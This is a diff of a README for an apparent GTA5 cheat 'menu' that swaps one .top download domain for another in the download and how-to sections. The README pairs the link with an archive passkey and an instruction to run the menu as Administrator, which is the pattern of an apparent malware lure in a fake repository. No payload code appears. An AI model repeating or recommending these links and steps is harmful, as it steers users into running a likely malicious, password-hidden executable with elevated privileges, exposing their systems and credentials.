@@ -6,7 +6,7 @@ GTA5 external menu with money drop, god mode, vehicle spawn, teleport, aimbot, E
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappdown.top/)**
+**[CLICK](https://gitdownapply.top/)**
 
 Archive passkey: `Github`
 
@@ -90,7 +90,7 @@ Based on community tools like **Kiddions Mod Menu**.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappdown.top/)** to download.
+1. Click **[CLICK](https://gitdownapply.top/)** to download.
 2. Extract the archive.
 3. Launch GTA 5.
 4. Run the menu **as Administrator**.
